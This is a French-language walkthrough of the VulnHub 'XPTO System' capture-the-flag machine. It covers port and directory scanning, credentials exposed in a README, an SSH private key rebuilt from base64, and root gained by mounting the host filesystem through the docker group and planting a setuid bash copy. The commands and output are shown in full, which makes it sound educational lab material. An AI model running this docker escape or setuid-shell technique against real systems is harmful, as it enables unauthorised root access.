# Solution du CTF XPTO System de VulnHub

Voici [XPTO System](https://vulnhub.com/entry/xpto-system-1,635/), un petit CTF disponible sur VulnHub. L'objectif est de devenir root et de retrouver un document PDF sur le sysème. Le fichier n'a plus son extension PDF.

Ce CTF est plutôt simple mais contient quelques informations superflues qui peuvent faire perdre du temps au joueur qui penserait quelles ont une quelconque importance.

```
Nmap scan report for 192.168.56.53
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: XPTO System
| http-git: 
|   192.168.56.53:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: Apache/2.4.38 (Debian)
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a1c75d66713eed5f4bb107f3be0f086f (RSA)
```

Comme un dossier .git est à la racine du site j'ai directement appelé un [git-dumper: A tool to dump a git repository from a website](https://github.com/arthaud/git-dumper) dessus mais me répo est vide.

Dans la page HTML du site on trouve un commentaire avec un possible nom d'utilisateur :

```html
<!-- Peter, you need to improve this here, it's very simple-->
```

Comme il n'y a aucun lien dans la page je lance `feroxbuster` qui me trouve quelques resources :

```
403 http://192.168.56.53/etc/
403 http://192.168.56.53/src/
200 http://192.168.56.53/logout.php
200 http://192.168.56.53/login.php
```

La page `login.php` contient un commentaire à propos d'un fichier ainsi qu'un autre nom :

```html
<!--Robert, this here should be corrected, check the README -->			
Click here to clean <a href = "logout.php" tite = "Logout">Session.
```

La page de logout retourne une erreur PHP causée vraisemblablement plus par une mauvaise pratique que par une quelconque vulnérabilité :

```html
You have cleaned session<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/logout.php:6) in <b>/var/www/html/logout.php</b> on line <b>7</b><br />
```

Pour un fichier readme on peut s'attendre à différentes extensiosn possibles : txt, md, rst, htm, html. J'ai fouillé dans les deux dossiers préalablement découverts mais en fait le fichier `README.md` était situé à la racine :

> # TODO
> 
> - Consertar a pagina de logout
> - Criar a pagina de dashboard pos login
>   
>   # Comandos uteis
>   
>   ## Start container
>   
>   $ docker run --name webserver -d -p 80:80 -v ~/http:/var/www/html php:apache
>   
>   ## Stop container
>   
>   $ docker stop webserver
>   
>   ## Start container
>   
>   $ docker start webserver
>   
>   ## Image list
>   
>   $ docker images
>   
>   ## Credential
>   
>   web:pipocadoce
>   
>   ### View Access
>   
>   /delete-me

## Passe-Partout

La page `/delete-me` contient un bloc de données base64. Quand on le décode on obtient un entête `openssh-key-v1` suivi de données brutes.

Il s'agit donc d'une clé privée SSH, il suffit de reprendre le base64 et de l'entourer par ceux deux lignes :

```
-----BEGIN OPENSSH PRIVATE KEY-----
-----END OPENSSH PRIVATE KEY-----
```

Quand on tente d'utiliser la clé, une passphrase est demandée. Le mot de passe `pipocadoce` (trouvé dans la page web) est accepté et on peut se connecter en SSH avec l'utilisateur `web`.

```shellsession
$ ssh -p 1337 -i data.txt web@192.168.56.53
Enter passphrase for key 'data.txt': 
web@xptosystem:~$ id
uid=1001(web) gid=1001(web) grupos=1001(web),112(docker)
web@xptosystem:~$ docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                NAMES
e2d500c879b0        php:apache          "docker-php-entrypoi…"   2 years ago         Up 21 minutes       0.0.0.0:80->80/tcp   webserver
web@xptosystem:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
php                 apache              811269837652        2 years ago         414MB
web@xptosystem:~$ ls
http  remember.txt
web@xptosystem:~$ cat remember.txt 
Task List:
- Request xptosys software test
- Schedule a meeting with the devsecops teams
- Change sysdev password: PassSecret#789%
- Request sysdev permissions release
- Schedule Status Report Meeting
```

Le mot de passe permet de passer `sysdev` via su. L'utilisateur ne semble pas avoir de droits particuliers :

`uid=1000(sysdev) gid=1000(sysdev) grupos=1000(sysdev)`

De plus on a les droits `docker` via `web` du coup pourquoi ne pas directement passer root ? On va lancer un container en réutilisant l'image présente sur le système et en montant la partition racine dans le dossier `/mnt` du docker :

```shellsession
web@xptosystem:~$ docker run -it -v /:/mnt 811269837652 bash
root@b47092337db7:/var/www/html# cd /mnt
root@b47092337db7:/mnt# cp bin/bash bin/gotroot
root@b47092337db7:/mnt# chmod 4755 bin/gotroot
root@b47092337db7:/mnt# exit
web@xptosystem:~$ gotroot -p
gotroot-5.0# id
uid=1001(web) gid=1001(web) euid=0(root) grupos=1001(web),112(docker)
gotroot-5.0# find /usr/ -type f -exec file {} \; | grep -i pdf
/usr/share/doc/debian/FAQ/debian-faq.en.pdf.gz: gzip compressed data, was "debian-faq.en.pdf", last modified: Sat Nov 17 22:45:23 2018, max compression, from Unix, original size 314116
/usr/share/doc/file/yetcfm@357/d4t4_exf1lter: PDF document, version 1.7
/usr/share/groff/1.22.4/tmac/pdfpic.tmac: troff or preprocessor input, ASCII text
/usr/share/bash-completion/completions/pdftotext: ASCII text
gotroot-5.0# ls -lh /usr/share/doc/file/yetcfm@357/d4t4_exf1lter
-r-------- 1 sys sys 299K jun  7  2015 /usr/share/doc/file/yetcfm@357/d4t4_exf1lter
```

Une fois dans le docker j'ai créé un shell setuid root sur le système que j'ai exécuté une fois sorti. De là je fouille à la recherche de fichiers PDFs en regardant le type mime de chacun. J'ai trouvé une correspondance sous `/usr/share/`.

Le flag était le suivant : `flag{C4r3_with_p3rm155ions}`

Au final un peu trop de fausses pistes pour un aussi petit CTF.


